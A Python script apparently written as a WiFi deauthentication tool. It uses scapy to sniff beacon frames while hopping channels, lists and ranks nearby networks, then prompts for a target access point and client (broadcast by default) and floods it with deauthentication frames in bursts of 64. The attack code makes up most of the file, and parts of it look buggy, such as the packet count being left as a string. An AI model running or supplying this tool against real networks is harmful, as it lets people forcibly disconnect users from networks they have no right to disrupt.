import argparse
from multiprocessing import Process
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
import signal
import threading
# We must conduct aggregate at a multiple of 14 so the data is equally aggregated
#searches for networks and lists them
#below is the dictionary to store info
listOfNetworks=[]
Mash=[]
listOfMacs=[]
listOfChannels=[]
listOfThree=[listOfNetworks, listOfMacs, listOfChannels]
MashSet=set(Mash)
MashC=[]

def add(packet, network):
	#checks for hidden networks
	#ESSID identifies networks, BSSID identifies access points and their users
	essid = packet[Dot11Elt].info if '\x00' not in packet [Dot11Elt].info and packet [Dot11Elt].info != '' else 'Hidden SSID'
	bssid = packet[Dot11].addr3
	channel = int(ord(packet[Dot11Elt:3].info))
	storage(essid,bssid,channel)
	if bssid not in network:
			network[bssid] = (essid, channel)
			print "{0:5}\t{1:30}\t{2:20}".format(channel, essid, bssid)
			
def switch_channel(interface):
	#switches between WiFi channels
	while True:
		try:
			#11 channels standard in US, 13 in other countries
			channel = random.randrange(1,13)
			os.system("iwconfig %s channel %d" %(interface, channel))
			time.sleep(1)
		except KeyboardInterrupt:
			break
			
def stop_search(signal, frame):
	global stop_sniff
	stop_sniff = True
	channel_hop.terminate()
	channel_hop.join()
	
def cont_sniff(packet):
	return stop_sniff

def storage(essid,bssid,channel):
	#print("Storing", essid, " " , bssid , " on channel " , channel)
	listOfNetworks.append(essid)
	listOfMacs.append(bssid)
	listOfChannels.append(channel)
	Mash.append(essid + "," +  bssid + "," +  str(channel))
	#aggregate3()

def aggregate2(network):
	print(listOfNetworks.count(network))
	
def aggregate3():
	catch={}
	for i in range(len(Mash)):
		print(Mash[i] + " :  " + str(Mash.count(Mash[i])))

def aggregate4():
	MashSet=set(Mash)
	Holder=[]
	#print ("In aggregate4")
	q=0
	for i in MashSet:
		#print(str(i) + " : " + str(Mash.count(i)))
		#print("iteration in the loop complete")
		MashC.append([Mash.count(i),i])
	MashC.sort(key=lambda x: x[0], reverse=True)	
	#print("Printing all of MashC")
	for i in range(len(MashC)):
		print MashC[i]

def deAuth(bssid, client, count):
	packet = Dot11(addr1=client, addr2=bssid, addr3=bssid) / Dot11Deauth()
	cli_to_ap_pckt = None
	if client != 'FF:FF:FF:FF:FF:FF' : cli_to_ap_pckt = Dot11(addr1=bssid, addr2=client, addr3=bssid) / Dot11Deauth()
	if not count: print('CTRL+c to cancel')
		#sends deauth packets in bursts of 64
	while count != 0:
		try:
			for i in range(64):
				send(packet)
				if client != 'FF:FF:FF:FF:FF:FF': send(cli_to_ap_pckt)
			count = count -1
		except KeyboardInterrupt:
			break

if __name__ == "__main__":
	parser = argparse.ArgumentParser(description = 'Uses aircrack-ng') 
	parser.add_argument('-i', '--interface', dest='interface', type=str, required=True, help='Interface to use for sniffing and packet injection')
	args = parser.parse_args()
	networks = {}
	print('CTRL+c to cancel')
	stop_sniff = False
	print '='*160 + '\n{0:5}\t{1:30}\t{2:30}\n'.format('Channel      ', 'ESSID', 'BSSID') + '='*160
	channel_hop = Process(target = switch_channel, args=(args.interface,))
	channel_hop.start()
	#stop signal
	signal.signal(signal.SIGINT, stop_search)
	#lambda function
	#print("Entered Lambda Function")
	#sniff(lfilter = lambda x: (x.haslayer(Dot11Beacon) or x.haslayer(Dot11ProbeResp)), stop_filter=cont_sniff, prn=lambda x: add(x, networks))
	sniff(lfilter = lambda x: (x.haslayer(Dot11Beacon) or x.haslayer(Dot11ProbeResp)),prn=lambda x: add(x, networks), timeout=30)
	print("Finished")
	aggregate4()
	print("\nThe strongest 10 Networks are:")
	for i in range(10):
		print( "Option "  + str(i+1) + str(MashC[i]))
	#inputvalue=input("Please select which Network will be the target: ")
	#print(inputvalue)
	#if(inputvalue=1): #insert code here to run the deauth on whatever network is chosen
	#exit()
	signal.signal(signal.SIGINT, signal.SIG_DFL)
	target = raw_input('Enter your target: ')
	while target not in networks:
		print('Error: Network does not exist')
		exit()
	print('Switching ' + args.interface + ' to channel ' + str(networks[target][1]))
	os.system("iwconfig %s channel %d" % (args.interface, networks[target][1]))
	target_mac = raw_input('Default address is FF:FF:FF:FF:FF:FF, or enter another: ')
	if not target_mac: 
		target_mac = 'FF:FF:FF:FF:FF:FF'
	packet_num = raw_input('Number of packets to send: ')
	if not packet_num: 
		packet_num = -1
	deAuth(target, target_mac, packet_num)
